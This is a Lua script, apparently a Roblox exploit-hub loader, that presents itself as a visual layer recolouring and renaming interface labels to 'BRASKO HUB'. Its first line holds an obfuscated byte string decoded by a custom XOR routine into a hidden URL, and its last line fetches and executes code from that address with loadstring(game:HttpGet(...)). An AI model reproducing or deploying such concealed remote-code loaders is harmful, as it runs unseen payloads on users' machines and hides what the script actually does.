
--[[ STAGE 2: VISUAL CORE ]]
local Z93NOGszB6GUCJ5D="\141\154\146\221\219\229\230\150\226\225\238\225\151\158\157\173\169\172\137\158\245\239\235\233\242\179\165\161\189\137\161\190\181\180\171\136\175\254\169\176\064\190\068\184\190\071\155\178\073\072\074\084\066\086\172\186\065\073\064\064\092\188\145\081\085\078\083\158\092\093\075\098\095\080\095\097\082\160\094\110\098\094\099\100\109\090\104\106\106\180\107\118\099\183\126\113\105\121\124\126\107\123\119\006\001\119\003\127\012\122\121\065\011\126\008\078\079\083\021\011\016\017\014"local OA52JR2w9NFU2L_663rZq=68 local YTNcb9wZWLU7oQ37S51=99 local IvWyzgsjoEJw1N=1 local E32fiw7XbmFAGvQUNA8J0F=1 local x1lDGoqz8THaPdIVy93B=4 local prqkW5jHA2KmGmK=true local tobMUCcQZwn4SK8sM7yRla=bit32 and bit32.bxor if not tobMUCcQZwn4SK8sM7yRla then tobMUCcQZwn4SK8sM7yRla=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Se8KMvh2a0ca2Ckb={}for gHIE015LOevSftI=1,#Z93NOGszB6GUCJ5D do local sNxNiQCq8Oo3uZFw65DX_=string.byte(Z93NOGszB6GUCJ5D,gHIE015LOevSftI)local hJfVmHKVwJhBKtjcd015DQ=(YTNcb9wZWLU7oQ37S51+(gHIE015LOevSftI*E32fiw7XbmFAGvQUNA8J0F)+x1lDGoqz8THaPdIVy93B)%256 if IvWyzgsjoEJw1N==0 then sNxNiQCq8Oo3uZFw65DX_=(sNxNiQCq8Oo3uZFw65DX_-hJfVmHKVwJhBKtjcd015DQ)%256 Se8KMvh2a0ca2Ckb[gHIE015LOevSftI]=string.char(tobMUCcQZwn4SK8sM7yRla(sNxNiQCq8Oo3uZFw65DX_,OA52JR2w9NFU2L_663rZq))else sNxNiQCq8Oo3uZFw65DX_=tobMUCcQZwn4SK8sM7yRla(sNxNiQCq8Oo3uZFw65DX_,OA52JR2w9NFU2L_663rZq)Se8KMvh2a0ca2Ckb[gHIE015LOevSftI]=string.char((sNxNiQCq8Oo3uZFw65DX_-hJfVmHKVwJhBKtjcd015DQ)%256)end end local jt5I6FHuZSu5FE=table.concat(Se8KMvh2a0ca2Ckb)if prqkW5jHA2KmGmK then jt5I6FHuZSu5FE=string.reverse(jt5I6FHuZSu5FE)end local iN8DjKUjVg9rItq=jt5I6FHuZSu5FE
local HubName = "BRASKO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(iN8DjKUjVg9rItq))()
